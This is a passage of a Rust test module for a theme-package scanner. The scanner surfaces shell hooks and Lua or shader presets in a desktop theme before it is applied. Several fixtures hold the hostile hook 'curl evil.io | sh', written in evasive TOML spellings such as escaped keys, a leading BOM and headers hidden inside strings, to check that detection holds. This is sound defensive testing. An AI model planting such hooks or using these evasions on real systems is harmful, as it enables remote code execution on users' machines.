    /// attempt on that theme warns again.
    pub fn finish_confirm(&mut self) {
        self.confirmed = None;
    }

    /// The keeper pressed Cancel (or Escape): forget the pending attempt
    /// and change nothing. Returns whether there was one.
    pub fn cancel(&mut self) -> bool {
        self.pending.take().is_some()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    /// The shipped shape: a theme's `noctalia-v5` `settings.toml`.
    fn write_settings(theme: &Path, text: &str) {
        let dir = theme.join("providers").join("noctalia-v5");
        fs::create_dir_all(&dir).unwrap();
        fs::write(dir.join("settings.toml"), text).unwrap();
    }

    fn write_preset(theme: &Path, category: &str, name: &str) {
        let dir = theme
            .join(crate::theme_presets::PRESETS_DIR)
            .join(category);
        fs::create_dir_all(&dir).unwrap();
        fs::write(dir.join(name), FIXTURE_PRESET_BODY).unwrap();
    }

    /// The body `write_preset` puts in every fixture preset. The expected
    /// reports below name it, because the body is PART of the report: a
    /// theme that keeps a preset's name and rewrites its body is a
    /// different package (W2c).
    const FIXTURE_PRESET_BODY: &str = "-- preset body\n";

    fn written_body() -> PresetBody {
        PresetBody::Text(FIXTURE_PRESET_BODY.into())
    }

    /// Every file under `root`, relative and sorted — a read-only fingerprint.
    fn tree(root: &Path) -> Vec<String> {
        let mut out = Vec::new();
        let mut stack = vec![root.to_path_buf()];
        while let Some(dir) = stack.pop() {
            let Ok(entries) = fs::read_dir(&dir) else {
                continue;
            };
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_dir() {
                    stack.push(path);
                } else {
                    out.push(path.strip_prefix(root).unwrap().display().to_string());
                }
            }
        }
        out.sort();
        out
    }

    /// W1: the report carries each hook key with its command text VERBATIM
    /// (the warning words itself from both), names the provider file it came
    /// from, and does NOT mistake data for commands: `[hooks]` also holds
    /// `community_ids = [ … ]`, which Noctalia never executes, and keys of
    /// other sections (`config_version`, `[wallpaper] path`) are not hooks.
    #[test]
    fn reports_each_hook_key_and_its_command_text_verbatim() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_settings(
            &theme,
            "config_version = \"1.2\"\n\
             \n\
             [hooks]\n\
             started = \"/home/other/.local/share/sddm/themes/SilentDinamic/sddm-sync.sh\"\n\
             colors_changed = \"notify-send palette changed\"\n\
             community_ids = [ \"abc\" ]\n\
             shutdown = \"sddm-watch.sh\" # the keeper's watchdog\n\
             \n\
             [wallpaper]\n\
             path = \"/home/other/wall.png\"\n",
        );

        let report = inspect_theme_package(&theme);

        assert_eq!(
            report.shell_hooks,
            vec![
                ShellHook {
                    provider: "noctalia-v5".into(),
                    key: "started".into(),
                    command: "/home/other/.local/share/sddm/themes/SilentDinamic/sddm-sync.sh"
                        .into(),
                },
                ShellHook {
                    provider: "noctalia-v5".into(),
                    key: "colors_changed".into(),
                    command: "notify-send palette changed".into(),
                },
                ShellHook {
                    provider: "noctalia-v5".into(),
                    key: "shutdown".into(),
                    command: "sddm-watch.sh".into(),
                },
            ],
            "each [hooks] key must come back with its command text verbatim, in file order; \
             an array value or another section's key is not a hook, got: {:?}",
            report.shell_hooks
        );
        assert!(
            !report.is_empty(),
            "a theme carrying hooks must not read as empty"
        );
        assert!(report.lua_presets.is_empty(), "this fixture carries no presets");
    }

    /// A MULTI-LINE string (`"""` / `'''`) is one legal TOML value, and
    /// Noctalia's parser hands the whole string to the shell as ONE command.
    /// The line reader used to drop the opener (the hook vanished: the gate
    /// saw an EMPTY package) and to let inner lines surface as fake
    /// `key = value` hooks. The real command — every line of the string —
    /// must be reported under the key it belongs to, in file order.
    #[test]
    fn a_multi_line_hook_string_reports_its_real_command() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_settings(
            &theme,
            "[hooks]\n\
             started = \"\"\"\n\
             export FOO=bar\n\
             echo \"$FOO\"\n\
             \"\"\"\n\
             colors_changed = \"notify-send hi\"\n",
        );

        let report = inspect_theme_package(&theme);

        assert_eq!(
            report.shell_hooks,
            vec![
                ShellHook {
                    provider: "noctalia-v5".into(),
                    key: "started".into(),
                    command: "export FOO=bar\necho \"$FOO\"\n".into(),
                },
                ShellHook {
                    provider: "noctalia-v5".into(),
                    key: "colors_changed".into(),
                    command: "notify-send hi".into(),
                },
            ],
            "the multi-line string is ONE hook command (no key invented from its \
             inner lines), got: {:?}",
            report.shell_hooks
        );
        assert!(!report.is_empty(), "a multi-line hook must not read as empty");

        // The literal (`'''`) spelling is the same value to a TOML parser.
        let literal = tmp.path().join("Literal");
        write_settings(
            &literal,
            "[hooks]\nshutdown = '''\npkill -x sddm-watch\n'''\n[idle]\nenabled = true\n",
        );
        let report = inspect_theme_package(&literal);
        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "shutdown".into(),
                command: "pkill -x sddm-watch\n".into(),
            }],
            "a ''' multi-line literal must report its command too, got: {:?}",
            report.shell_hooks
        );
    }

    /// A QUOTED table header (`["hooks"]`, `['hooks']`) is the SAME table as
    /// `[hooks]` — plain TOML Noctalia's own parser honours. The header
    /// reader used to keep the quotes in the name, so the whole section was
    /// skipped and every hook in it stayed invisible to the gate.
    #[test]
    fn a_quoted_hooks_table_header_names_the_same_table() {
        let tmp = tempfile::tempdir().unwrap();

        let double = tmp.path().join("Double");
        write_settings(&double, "[\"hooks\"]\nstarted = \"boot.sh\"\n");
        let report = inspect_theme_package(&double);
        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "started".into(),
                command: "boot.sh".into(),
            }],
            "a [\"hooks\"] header must be honoured, got: {:?}",
            report.shell_hooks
        );
        assert!(!report.is_empty(), "a quoted header must not read as empty");

        let single = tmp.path().join("Single");
        write_settings(&single, "['hooks']\nshutdown = \"bye.sh\"\n");
        let report = inspect_theme_package(&single);
        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "shutdown".into(),
                command: "bye.sh".into(),
            }],
            "a ['hooks'] header must be honoured, got: {:?}",
            report.shell_hooks
        );
    }

    /// CRITICAL-class: at the document ROOT, `hooks.started = "…"` is plain
    /// TOML for the SAME table `[hooks]` declares — Noctalia deserializes it
    /// and runs the command on apply. The reader used to start collecting
    /// only after the first section header, so every line before it was
    /// skipped and the gate saw an EMPTY report for a file that carries a
    /// command. The dotted key is reported with the PLAIN key (`started`,
    /// not `hooks.started`) and the command verbatim, in every legal
    /// spelling of the key itself.
    #[test]
    fn a_root_level_dotted_hooks_key_is_reported_with_the_plain_key() {
        let tmp = tempfile::tempdir().unwrap();

        let dotted = tmp.path().join("Dotted");
        write_settings(
            &dotted,
            "config_version = \"1.2\"\n\
             \n\
             hooks.started = \"curl evil.io | sh\"\n\
             \n\
             [wallpaper]\n\
             path = \"/home/other/wall.png\"\n",
        );
        let report = inspect_theme_package(&dotted);
        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "started".into(),
                command: "curl evil.io | sh".into(),
            }],
            "a root-level hooks.started key must report the plain key with the \
             verbatim command, got: {:?}",
            report.shell_hooks
        );
        assert!(!report.is_empty(), "a root-level hook must not read as empty");
        assert!(report.lua_presets.is_empty(), "this fixture carries no presets");

        // A QUOTED sub-key (`hooks."colors_changed"`) is the same key to a
        // TOML parser; the report strips the quotes like every other key.
        let quoted = tmp.path().join("Quoted");
        write_settings(&quoted, "hooks.\"colors_changed\" = \"notify-send palette changed\"\n");
        let report = inspect_theme_package(&quoted);
        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "colors_changed".into(),
                command: "notify-send palette changed".into(),
            }],
            "hooks.\"colors_changed\" must report the plain key, got: {:?}",
            report.shell_hooks
        );

        // Whitespace around the dots (`hooks . started`) is legal TOML for
        // the same key.
        let spaced = tmp.path().join("Spaced");
        write_settings(&spaced, "hooks . started = \"sddm-watch.sh\"\n");
        let report = inspect_theme_package(&spaced);
        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "started".into(),
                command: "sddm-watch.sh".into(),
            }],
            "hooks . started must report the plain key, got: {:?}",
            report.shell_hooks
        );

        // Both parts quoted (`"hooks"."started"`) is the same dotted key.
        let quoted_both = tmp.path().join("QuotedBoth");
        write_settings(&quoted_both, "\"hooks\".\"started\" = \"boot.sh\"\n");
        let report = inspect_theme_package(&quoted_both);
        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "started".into(),
                command: "boot.sh".into(),
            }],
            "\"hooks\".\"started\" must report the plain key, got: {:?}",
            report.shell_hooks
        );
    }

    /// The dotted spelling carries a MULTI-LINE string too: Noctalia's
    /// parser hands the whole string to the shell as ONE command, so the
    /// opener line must not vanish (the gate would see an empty report
    /// while the command runs on apply).
    #[test]
    fn a_root_level_dotted_hook_with_a_multi_line_string_reports_its_real_command() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_settings(
            &theme,
            "hooks.started = \"\"\"\n\
             export FOO=bar\n\
             echo \"$FOO\"\n\
             \"\"\"\n\
             [idle]\n\
             enabled = true\n",
        );

        let report = inspect_theme_package(&theme);

        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "started".into(),
                command: "export FOO=bar\necho \"$FOO\"\n".into(),
            }],
            "the root-level multi-line string is ONE hook command under the plain \
             key, got: {:?}",
            report.shell_hooks
        );
        assert!(!report.is_empty(), "a root-level multi-line hook must not read as empty");
    }

    /// CRITICAL-class, the inline-table spelling: `hooks = { … }` written at
    /// the root IS the `[hooks]` table. Every entry is reported like a pair
    /// under the header — quoted keys, extra whitespace and a trailing comma
    /// are all legal TOML for it.
    #[test]
    fn a_root_level_inline_hooks_table_reports_every_entry() {
        let tmp = tempfile::tempdir().unwrap();

        let one = tmp.path().join("One");
        write_settings(&one, "hooks = { started = \"curl evil.io | sh\" }\n");
        let report = inspect_theme_package(&one);
        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "started".into(),
                command: "curl evil.io | sh".into(),
            }],
            "a root-level hooks = {{ … }} table must report its entry, got: {:?}",
            report.shell_hooks
        );
        assert!(!report.is_empty(), "a root-level inline hook must not read as empty");

        let many = tmp.path().join("Many");
        write_settings(
            &many,
            "hooks = {  \"started\" = \"curl evil.io | sh\" ,  \
             colors_changed = \"notify-send hi\" , }\n",
        );
        let report = inspect_theme_package(&many);
        assert_eq!(
            report.shell_hooks,
            vec![
                ShellHook {
                    provider: "noctalia-v5".into(),
                    key: "started".into(),
                    command: "curl evil.io | sh".into(),
                },
                ShellHook {
                    provider: "noctalia-v5".into(),
                    key: "colors_changed".into(),
                    command: "notify-send hi".into(),
                },
            ],
            "every entry of the root-level inline table must be reported in order \
             (quoted keys, extra whitespace, trailing comma), got: {:?}",
            report.shell_hooks
        );
    }

    /// A MULTI-LINE string is a legal value inside an inline table (the
    /// newline is within the value), and it is still ONE command Noctalia
    /// runs — the opener line must not hide it from the gate.
    #[test]
    fn a_root_level_inline_hooks_table_with_a_multi_line_string_reports_its_command() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_settings(
            &theme,
            "hooks = { started = \"\"\"\n\
             pkill -x sddm-watch\n\
             \"\"\" }\n",
        );

        let report = inspect_theme_package(&theme);

        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "started".into(),
                command: "pkill -x sddm-watch\n".into(),
            }],
            "a multi-line string inside the root-level inline table is ONE hook \
             command, got: {:?}",
            report.shell_hooks
        );
        assert!(!report.is_empty(), "a root-level inline multi-line hook must not read as empty");
    }

    /// The "an empty value is not a hook" rule holds for both root-level
    /// spellings: nothing to run, nothing to warn about.
    #[test]
    fn an_empty_command_in_a_root_level_hooks_spelling_is_not_reported() {
        let tmp = tempfile::tempdir().unwrap();

        let dotted = tmp.path().join("Dotted");
        write_settings(&dotted, "hooks.started = \"\"\n");
        let report = inspect_theme_package(&dotted);
        assert!(
            report.is_empty(),
            "an empty root-level dotted command is not a hook, got: {:?}",
            report
        );

        let inline = tmp.path().join("Inline");
        write_settings(&inline, "hooks = { started = \"\" }\n");
        let report = inspect_theme_package(&inline);
        assert!(
            report.is_empty(),
            "an empty root-level inline-table command is not a hook, got: {:?}",
            report
        );
    }

    /// The root-level spellings count ONLY at the document ROOT. Under a
    /// section the same text is `<section>.hooks.started`, which Noctalia
    /// never executes — reporting it would nag the keeper over nothing.
    #[test]
    fn root_level_hooks_spellings_under_a_section_are_not_reported() {
        let tmp = tempfile::tempdir().unwrap();

        let dotted = tmp.path().join("Dotted");
        write_settings(&dotted, "[noctalia]\nhooks.started = \"x\"\n");
        let report = inspect_theme_package(&dotted);
        assert!(report.shell_hooks.is_empty(), "got: {:?}", report.shell_hooks);
        assert!(report.is_empty(), "noctalia.hooks.started is not a hook");

        let inline = tmp.path().join("Inline");
        write_settings(&inline, "[other]\nhooks = { started = \"x\" }\n");
        let report = inspect_theme_package(&inline);
        assert!(report.shell_hooks.is_empty(), "got: {:?}", report.shell_hooks);
        assert!(report.is_empty(), "other.hooks is not the hooks table");
    }

    /// A QUOTED key with a dot inside it is ONE literal key name in TOML
    /// (`"127.0.0.1" = …` is a valid key in the spec): `"hooks.started"` is
    /// NOT the hooks table, and Noctalia never executes it — reporting it
    /// would be a false positive that nags the keeper over nothing.
    #[test]
    fn a_fully_quoted_dotted_key_is_not_the_hooks_table() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_settings(&theme, "\"hooks.started\" = \"curl evil.io | sh\"\n");

        let report = inspect_theme_package(&theme);

        assert!(report.shell_hooks.is_empty(), "got: {:?}", report.shell_hooks);
        assert!(
            report.is_empty(),
            "\"hooks.started\" is one literal key, not the hooks table, got: {:?}",
            report
        );
    }

    /// The `{` false positive: a VALUE that opens an inline table (a nested
    /// config, never a command) must report NOTHING. The reader used to fall
    /// into the unquoted-value branch and report the bogus command `"{"`,
    /// nagging the keeper on a theme that carries no command at all.
    #[test]
    fn an_inline_table_value_inside_the_hooks_section_reports_nothing() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_settings(
            &theme,
            "[hooks]\n\
             started = { cmd = \"echo hi\" }\n\
             [wallpaper]\n\
             path = \"/home/other/wall.png\"\n",
        );

        let report = inspect_theme_package(&theme);

        assert!(report.shell_hooks.is_empty(), "got: {:?}", report.shell_hooks);
        assert!(report.is_empty(), "an inline-table value is not a hook");
    }

    /// W1c-b, CRITICAL-class: a TOML BASIC string key carries ESCAPES, and
    /// a real parser decodes them BEFORE matching the table name — verified
    /// with `toml` 1.1.2 (`+spec-1.1.0`, this repo's lockfile): all three
    /// spellings below deserialize as `hooks.started = "…"`, so the command
    /// runs on apply while the reader compared the RAW text and reported
    /// NOTHING (the gate stayed silent — CRITICAL-1 again). A LITERAL
    /// string key has no escapes and is pinned as NOT hooks in
    /// [`spellings_that_are_not_the_hooks_table_stay_unreported`].
    #[test]
    fn a_basic_string_escape_in_a_key_names_the_hooks_table() {
        let tmp = tempfile::tempdir().unwrap();

        // The root dotted spelling with an escaped TABLE name.
        let dotted = tmp.path().join("Dotted");
        write_settings(&dotted, "\"\\u0068ooks\".started = \"curl evil.io | sh\"\n");
        let report = inspect_theme_package(&dotted);
        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "started".into(),
                command: "curl evil.io | sh".into(),
            }],
            "\"\\u0068ooks\".started IS the hooks table to a real parser, got: {:?}",
            report.shell_hooks
        );
        assert!(!report.is_empty(), "an escaped table name must not read as empty");

        // The header spelling with an escaped TABLE name.
        let header = tmp.path().join("Header");
        write_settings(&header, "[\"\\u0068ooks\"]\nstarted = \"curl evil.io | sh\"\n");
        let report = inspect_theme_package(&header);
        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "started".into(),
                command: "curl evil.io | sh".into(),
            }],
            "[\"\\u0068ooks\"] IS the hooks table to a real parser, got: {:?}",
            report.shell_hooks
        );
        assert!(!report.is_empty(), "an escaped header must not read as empty");

        // The escaped SUB-key of a dotted spelling.
        let sub = tmp.path().join("Sub");
        write_settings(&sub, "\"hook\\u0073\".started = \"x\"\n");
        let report = inspect_theme_package(&sub);
        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "started".into(),
                command: "x".into(),
            }],
            "\"hook\\u0073\".started IS the hooks table to a real parser, got: {:?}",
            report.shell_hooks
        );
        assert!(report.lua_presets.is_empty(), "these fixtures carry no presets");
    }

    /// W1c-b, CRITICAL-class: a UTF-8 BOM (U+FEFF) is accepted at the
    /// start of a TOML file and is NOT `char::is_whitespace`, so `trim()`
    /// never removed it — `<BOM>hooks.started = "…"` slipped past the root
    /// reader and a BOM before the first header slipped past the section
    /// reader (both PARSED as hooks by `toml` 1.1.2), while the command
    /// runs on apply and the gate saw an EMPTY report.
    #[test]
    fn a_leading_utf8_bom_does_not_hide_the_hooks_table() {
        let tmp = tempfile::tempdir().unwrap();

        let dotted = tmp.path().join("Dotted");
        write_settings(&dotted, "\u{feff}hooks.started = \"curl evil.io | sh\"\n");
        let report = inspect_theme_package(&dotted);
        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "started".into(),
                command: "curl evil.io | sh".into(),
            }],
            "a BOM before a root-level hooks key must not hide it, got: {:?}",
            report.shell_hooks
        );
        assert!(!report.is_empty(), "a BOM'd root-level hook must not read as empty");

        let header = tmp.path().join("Header");
        write_settings(&header, "\u{feff}[hooks]\nstarted = \"curl evil.io | sh\"\n");
        let report = inspect_theme_package(&header);
        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "started".into(),
                command: "curl evil.io | sh".into(),
            }],
            "a BOM before the first header must not hide the section, got: {:?}",
            report.shell_hooks
        );
        assert!(!report.is_empty(), "a BOM'd header hook must not read as empty");
    }

    /// W1d, CRITICAL-class (the hider): a header-shaped line INSIDE an
    /// untracked multi-line string is CONTENT, not a section. The line
    /// reader armed its multi-line tracker only for HOOK keys, so `[other]`
    /// inside `note`'s string was taken for a real header, the document
    /// root state was lost for ever, and `hooks.started` below it reported
    /// EMPTY while the hook executes on apply with a SILENT gate —
    /// CRITICAL-1 again. A real parser reads `hooks.started`.
    #[test]
    fn a_header_shaped_line_inside_a_multi_line_string_does_not_hide_a_root_hook() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_settings(
            &theme,
            "note = \"\"\"\n\
             [other]\n\
             \"\"\"\n\
             hooks.started = \"curl evil.io | sh\"\n",
        );

        let report = inspect_theme_package(&theme);

        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "started".into(),
                command: "curl evil.io | sh".into(),
            }],
            "the [other] line is inside a string: hooks.started after it is a ROOT \
             hook and must be reported, got: {:?}",
            report.shell_hooks
        );
        assert!(!report.is_empty(), "a root hook hidden behind a fake header must not read as empty");
    }

    /// W1d, the reverse hider: text that is ONLY a string must not be read
    /// as a hooks table. `[hooks]` and `started = "not real"` live inside
    /// `note`'s multi-line string, so the document declares no hooks table
    /// at all; the line reader armed the section state from the string's
    /// content and reported a hook for text Noctalia never parses as one —
    /// a CLEAN theme held behind a fake warning.
    #[test]
    fn a_hooks_table_inside_a_multi_line_string_is_not_a_hooks_table() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_settings(
            &theme,
            "note = \"\"\"\n\
             [hooks]\n\
             started = \"not real\"\n\
             \"\"\"\n",
        );

        let report = inspect_theme_package(&theme);

        assert!(
            report.shell_hooks.is_empty(),
            "a [hooks] header inside a string declares nothing, got: {:?}",
            report.shell_hooks
        );
        assert!(
            report.is_empty(),
            "text that is only a string must not hold a clean theme, got: {:?}",
            report
        );
    }

    /// W1c-b's spelling, now read by a REAL parser: a multi-line inline
    /// table is VALID TOML under spec 1.1 (`toml` 1.1.2 parses
    /// `hooks = {\n  started = "…"\n}`). The line reader could not follow it
    /// across lines and answered with a conservative entry; the parser
    /// reads the table like any other, so the REAL command is reported —
    /// strictly better than the fail-closed guess it replaces.
    #[test]
    fn a_multi_line_inline_hooks_table_reports_its_entry() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_settings(&theme, "hooks = {\nstarted = \"curl evil.io | sh\"\n}\n");

        let report = inspect_theme_package(&theme);

        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "started".into(),
                command: "curl evil.io | sh".into(),
            }],
            "a multi-line inline hooks table is valid TOML 1.1 and must report its \
             real entry, got: {:?}",
            report.shell_hooks
        );
        assert!(!report.is_empty(), "a multi-line inline hook must not read as empty");
        assert!(report.lua_presets.is_empty(), "this fixture carries no presets");

        // The gate holds on it: the keeper sees the line
        // `{key} — {command}` built from this very entry.
        let mut gate = TrustGate::new();
        assert_eq!(
            gate.request("Theme", 0, ApplyOrigin::Gallery, &report, false),
            GateDecision::Hold,
            "a multi-line inline hook must hold the apply behind the warning"
        );

        // An UNCLOSED inline table is not a spelling but broken TOML: it
        // does not parse, so the fail-closed rule answers with exactly one
        // conservative entry — never an empty report.
        let unclosed = tmp.path().join("Unclosed");
        write_settings(&unclosed, "hooks = { started = \"\"\n");
        let settings = unclosed.join("providers").join("noctalia-v5").join("settings.toml");
        let report = inspect_theme_package(&unclosed);
        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "hooks table".into(),
                command: format!(
                    "the hooks table in {} could not be read by this scan: \
                     the file does not parse as TOML; it may carry shell commands \
                     that are not listed here",
                    settings.display()
                ),
            }],
            "a file that does not parse must produce exactly one conservative entry, got: {:?}",
            report.shell_hooks
        );
        assert!(!report.is_empty(), "an unclosed hooks table must never read as empty");
    }

    /// W1c-b's residue spelling, now read by a REAL parser: when the
    /// multi-line string an inline table OPENS finally ends, the rest of
    /// that line can carry more entries (`""", shutdown = "evil" }`). The
    /// line reader never read them and failed closed beside what it had
    /// read; the parser reads ALL of them, so the report is complete —
    /// the opposite of a guess.
    #[test]
    fn entries_after_a_multi_line_string_in_an_inline_table_are_all_reported() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_settings(
            &theme,
            "hooks = { started = \"\"\"\npkill -x sddm-watch\n\"\"\", shutdown = \"evil\" }\n",
        );

        let report = inspect_theme_package(&theme);

        assert_eq!(
            report.shell_hooks,
            vec![
                ShellHook {
                    provider: "noctalia-v5".into(),
                    key: "started".into(),
                    command: "pkill -x sddm-watch\n".into(),
                },
                ShellHook {
                    provider: "noctalia-v5".into(),
                    key: "shutdown".into(),
                    command: "evil".into(),
                },
            ],
            "every entry of the inline table must be reported, including the ones \
             after the multi-line string, got: {:?}",
            report.shell_hooks
        );
        assert!(!report.is_empty());
    }

    /// The correctly-NOT-reported spellings (a real parser would not run
    /// them, so warning on them would nag the keeper over nothing) stay
    /// silent — they pin that parsing did NOT widen the gate: a LITERAL
    /// string key has no escapes in TOML (`'\u0068ooks'` is that literal
    /// key, verified against `toml` 1.1.2), `hooksx.started` and one quoted
    /// key with a dot inside are not the table, `[[hooks]]` is an array of
    /// tables Noctalia never deserializes as its hooks map, and `hooks = {}`
    /// is a readable, EMPTY table. Characterization: this must be green
    /// before AND after the change.
    #[test]
    fn spellings_that_are_not_the_hooks_table_stay_unreported() {
        let tmp = tempfile::tempdir().unwrap();

        let literal = tmp.path().join("Literal");
        write_settings(&literal, "['\\u0068ooks']\nstarted = \"x\"\n");
        assert!(
            inspect_theme_package(&literal).is_empty(),
            "a literal string key has no escapes: '\\u0068ooks' is NOT the hooks table"
        );

        let near_miss = tmp.path().join("NearMiss");
        write_settings(&near_miss, "hooksx.started = \"x\"\n");
        assert!(
            inspect_theme_package(&near_miss).is_empty(),
            "hooksx.started is not the hooks table"
        );

        let array = tmp.path().join("Array");
        write_settings(&array, "[[hooks]]\nstarted = \"x\"\n");
        assert!(
            inspect_theme_package(&array).is_empty(),
            "[[hooks]] is an array of tables, not the hooks map"
        );

        let empty = tmp.path().join("Empty");
        write_settings(&empty, "hooks = {}\n");
        assert!(
            inspect_theme_package(&empty).is_empty(),
            "hooks = {{}} is a readable empty table"
        );
    }

    /// W1d: only a STRING value is a command. A bool, a number, an array
    /// or a sub-table under `hooks` is data Noctalia never executes (its
    /// hooks map is a flat string map), so none of them is reported — the
    /// old line reader's `hooks.enabled = true` → command `"true"` false
    /// positive is gone, and dropping it is right: a non-string is never
    /// run as a command.
    #[test]
    fn non_string_values_under_hooks_are_not_commands() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_settings(
            &theme,
            "[hooks]\n\
             enabled = true\n\
             retries = 3\n\
             community_ids = [ \"abc\" ]\n\
             sub = { nested = \"x\" }\n\
             started = \"real.sh\"\n",
        );

        let report = inspect_theme_package(&theme);

        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "started".into(),
                command: "real.sh".into(),
            }],
            "only the string entry is a command; a bool, number, array or table \
             under [hooks] is data, got: {:?}",
            report.shell_hooks
        );
    }

    /// Acceptance criterion 2: an empty `[hooks]` section and no presets
    /// still reads EMPTY — the gate never fires for a theme with nothing to
    /// report.
    #[test]
    fn an_empty_hooks_section_with_no_presets_still_reports_an_empty_report() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_settings(&theme, "[hooks]\n");

        let report = inspect_theme_package(&theme);

        assert!(report.shell_hooks.is_empty(), "got: {:?}", report.shell_hooks);
        assert!(report.lua_presets.is_empty(), "this fixture carries no presets");
        assert!(report.is_empty());
    }

    /// Every `providers/<provider>/settings.toml` is walked, not only the
    /// shipped `noctalia-v5`, and each hook names the provider it came from.
    #[test]
    fn walks_every_provider_settings_file() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_settings(&theme, "[hooks]\nstarted = \"boot.sh\"\n");
        let other = theme.join("providers").join("some-other-tool");
        fs::create_dir_all(&other).unwrap();
        fs::write(other.join("settings.toml"), "[hooks]\nshutdown = \"bye.sh\"\n").unwrap();

        let report = inspect_theme_package(&theme);

        let pairs: Vec<(String, String)> = report
            .shell_hooks
            .iter()
            .map(|h| (h.provider.clone(), h.key.clone()))
            .collect();
        assert_eq!(
            pairs,
            vec![
                ("noctalia-v5".to_string(), "started".to_string()),
                ("some-other-tool".to_string(), "shutdown".to_string()),
            ],
            "provider dirs are walked in sorted order, got: {:?}",
            report.shell_hooks
        );
    }

    /// A `settings.toml` with no `[hooks]` at all carries no hook.
    #[test]
    fn a_settings_toml_without_a_hooks_section_reports_no_hooks() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_settings(
            &theme,
            "[wallpaper]\npath = \"/home/other/wall.png\"\n\n[shell]\nenabled = true\n",
        );

        let report = inspect_theme_package(&theme);

        assert!(report.shell_hooks.is_empty(), "got: {:?}", report.shell_hooks);
        assert!(
            report.is_empty(),
            "a theme with neither hooks nor Lua presets must read as empty"
        );
    }

    /// The SHIPPED shape: package-time sanitizing drops the machine-only hook
    /// lines and leaves the header with an EMPTY body — no hook, no warning.
    #[test]
    fn an_empty_hooks_section_reports_no_hooks() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_settings(&theme, "[hooks]\n\n[idle]\nenabled = true\n");

        let report = inspect_theme_package(&theme);

        assert!(report.shell_hooks.is_empty(), "got: {:?}", report.shell_hooks);
        assert!(report.is_empty());
    }

    /// W1: the report names the preset files the package carries (names AND
    /// theme-relative paths for the warning), only from the category
    /// directories `install_theme_presets` reads on apply, and only the
    /// extensions it installs (`*.lua`, `*.frag` — `PRESET_EXTENSIONS`): a
    /// stray text file and a preset outside the installable categories
    /// never reach the user store, so they are not presets this gate must
    /// name. A `.frag` in `borders/` DOES reach `overlay.lua` — the apply
    /// resolves it by name and `cat`s it — so it IS named (next test).
    #[test]
    fn reports_the_lua_presets_the_package_carries() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_preset(&theme, "animations", "travel.lua");
        write_preset(&theme, "borders", "Space.lua");
        write_preset(&theme, "animations", "notes.txt");
        write_preset(&theme, "borders", "scan.frag");
        write_preset(&theme, "stray-category", "evil.lua");

        let report = inspect_theme_package(&theme);

        assert_eq!(
            report.lua_presets,
            vec![
                LuaPreset {
                    category: "animations".into(),
                    file_name: "travel.lua".into(),
                    body: written_body(),
                },
                LuaPreset {
                    category: "borders".into(),
                    file_name: "Space.lua".into(),
                    body: written_body(),
                },
                LuaPreset {
                    category: "borders".into(),
                    file_name: "scan.frag".into(),
                    body: written_body(),
                },
            ],
            "every preset the apply installs and can execute must be named in \
             CATEGORIES order, got: {:?}",
            report.lua_presets
        );
        assert_eq!(
            report.lua_presets[0].theme_relative_path(),
            Path::new("presets/animations/travel.lua"),
            "the warning must be able to show where the preset lives"
        );
        assert!(report.shell_hooks.is_empty());
        assert!(!report.is_empty(), "a theme carrying presets must not read as empty");
    }

    /// The report must name what the apply ACTUALLY installs and executes,
    /// which is wider than `*.lua`: `install_theme_presets` installs every
    /// `PRESET_EXTENSIONS` file (`lua`, `frag`) into the user store, and for
    /// `animations/` and `borders/` the shell resolves the preset BY NAME,
    /// content-blind (`hve_resolve_preset`), then `cat`s whatever file it
